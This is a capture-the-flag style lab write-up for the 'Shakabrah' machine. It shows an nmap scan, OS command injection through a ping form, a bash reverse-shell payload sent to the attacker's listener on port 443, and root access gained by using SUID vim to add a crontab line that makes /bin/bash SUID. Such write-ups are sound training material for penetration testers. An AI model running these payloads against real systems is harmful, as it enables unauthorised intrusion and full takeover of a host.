--------------------------------
# Shakabrah Writeup
--------------------------------

## Info-sheet
- IP-address: 192.168.122.86
- DNS-Domain name: N/A
- Host name: Shakabrah
- OS: Linux

## Overview
This box is quit easy box, gaining foothold through OS command injection on the website, and get root access by abusing misconfigured SUID perm on `vim.basic`.

-------
## Recon
-------
Services and ports:
```bash
# Nmap 7.91 scan initiated Sun Sep  5 21:44:33 2021 as: nmap -v -A -oN scans/nmap.txt -Pn 192.168.122.86  
Nmap scan report for 192.168.122.86  
Host is up (0.085s latency).  
Not shown: 998 filtered ports  
PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:    
|   2048 33:b9:6d:35:0b:c5:c4:5a:86:e0:26:10:95:48:77:82 (RSA)  
|   256 a8:0f:a7:73:83:02:c1:97:8c:25:ba:fe:a5:11:5f:74 (ECDSA)  
|_  256 fc:e9:9f:fe:f9:e0:4d:2d:76:ee:ca:da:af:c3:39:9e (ED25519)  
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))  
| http-methods:    
|_  Supported Methods: GET HEAD POST OPTIONS  
|_http-server-header: Apache/2.4.29 (Ubuntu)  
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).  
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port  
Device type: general purpose  
Running (JUST GUESSING): Linux 4.X|5.X (85%)  
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5  
Aggressive OS guesses: Linux 4.15 - 5.6 (85%), Linux 5.0 - 5.3 (85%)  
No exact OS matches for host (test conditions non-ideal).  
Uptime guess: 0.789 days (since Sun Sep  5 02:48:42 2021)  
Network Distance: 2 hops  
TCP Sequence Prediction: Difficulty=251 (Good luck!)  
IP ID Sequence Generation: All zeros  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
TRACEROUTE (using port 80/tcp)  
HOP RTT       ADDRESS  
1   106.94 ms 192.168.49.1  
2   106.93 ms 192.168.122.86  
  
Read data files from: /usr/bin/../share/nmap  
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
# Nmap done at Sun Sep  5 21:45:03 2021 -- 1 IP address (1 host up) scanned in 30.06 seconds
```

## Foothold
### Port 80 - Web server
/index.php
- The web page showing a form that let us enter IP address and to verify if it up or not
- entered input: `127.0.0.1`
```bash

PING localhost (127.0.0.1) 56(84) bytes of data.
64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.022 ms
64 bytes from localhost (127.0.0.1): icmp_seq=2 ttl=64 time=0.056 ms
64 bytes from localhost (127.0.0.1): icmp_seq=3 ttl=64 time=0.057 ms
64 bytes from localhost (127.0.0.1): icmp_seq=4 ttl=64 time=0.042 ms

--- localhost ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3070ms
rtt min/avg/max/mdev = 0.022/0.044/0.057/0.014 ms
```
- Possible template command being run on the server --> `ping -c 4 $input`
- If there no filtering of the input, we may be able to perform *OS command injections*
- For PoC, we entered input: `; id`, the `;` gonna end the ping command and so execute our command `id`
```bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
- possible command that ran on the server: `ping -c 4; id`

--------
## Exploitation
--------

### Port 80 - Web server
##### OS command injection
- We want to get reverse shell back, using simple bash reverse shell payload `bash -i >& /dev/tcp/$LHOST/1337 0>&1`
- Full payload to injection `; /bin/bash -c 'bash -i >& /dev/tcp/192.168.49.122/1337 0>&1'`
- Setup listener: `nc -lvnp 1337`
- Executed the payload, we're not recieve any connection back sadly
- Possibly, there some *firewall* setted up on the server, preventing outbound connection to some abnormal ports, like `1337` for example
- We change our listening port to port 443, a default port for Https/SSL
- set up listener and execute payload again
- We got connection back
```bash
kenobi@cg-home:~$ sudo nc -lvp 443
listening on [any] 443 ...
192.168.122.86: inverse host lookup failed: Unknown host
connect to [192.168.49.122] from (UNKNOWN) [192.168.122.86] 55428
/bin/sh: 0: can't access tty; job control turned off
$ 
```
- stabalize our shell, by spawning tty shell: `python3 -c 'import pty; pty.spawn("/bin/bash")'`
```bash
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@shakabrah:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@shakabrah:/var/www/html$
```

------------
## Privilege Escalation
------------

### SUID
- We perform basic SUID enumeration: `find / -perm -4000 2>/dev/null`
```bash
www-data@shakabrah:/var/www/html$ find / -perm -4000 2> /dev/null
find / -perm -4000 2> /dev/null
... SNIP ...
/bin/umount
/bin/fusermount
/usr/bin/newgidmap
/usr/bin/pkexec
--> /usr/bin/vim.basic <--
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/passwd
... SNIP ...
```
- vim.basic have SUID permission, this mean we be able to edit any files with permission as root using this binary
- We edit `/etc/crontab`, and add `* *  * * * *  root  chmod +s /bin/bash`
```bash
# /etc/crontab: system-wide crontab  
# Unlike any other crontab you don't have to run the `crontab'  
# command to install the new version when you edit this file  
# and files in /etc/cron.d. These files also have username fields,  
# that none of the other crontabs do.  
  
SHELL=/bin/sh  
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin  
  
# Example of job definition:  
# .---------------- minute (0 - 59)  
# |  .------------- hour (0 - 23)  
# |  |  .---------- day of month (1 - 31)  
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...  
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat  
# |  |  |  |  |  
# *  *  *  *  * user-name command to be executed  
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly  
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )  
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )  
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly ) 
*  *    * * *   root    chmod +s /bin/bash
#
```
- What this does is, it add a task to be run concurrently every minute, and the task is to add SUID bit permission to /bin/bash as root
- We wait for a min, check /bin/bash permission: `ls -la /bin/bash`
```bash
-rwsr-sr-x 1 root root 1234376 Feb 24  2021 /bin/bash
```
- Now we can use [[gtfobins.github.io]] as a reference for SUID bit perm on `/bin/bash`
- If you an experienced pen-tester, we already know we can run `/bin/bash -p` to spawn shell with SUID privilege.
```bash
www-data@shakabrah:/$ /bin/bash -p
bash-5.1# id
uid=33(www-data) gid=33(www-data) groups=33(www-data) euid=0(root) egid=0(root) groups=0(root)
bash-5.1# whoami
root
bash-5.1#
```

##### Rooted!

###### References
- https://gtfobins.github.io/
- https://www.offensive-security.com/labs/individual/